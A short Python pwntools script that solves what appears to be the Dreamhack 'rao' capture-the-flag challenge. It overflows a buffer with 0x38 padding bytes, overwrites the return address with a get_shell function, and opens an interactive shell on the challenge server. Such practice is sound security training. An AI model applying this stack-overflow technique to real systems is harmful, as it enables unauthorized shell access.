from pwn import *

exe = ELF('./rao', checksec=False)
p = remote("host1.dreamhack.games", 21313)
# p = process(exe.path)

input()
payload = b'a'*0x38 + p64(exe.sym['get_shell'])
p.sendlineafter(': ', payload)

p.interactive()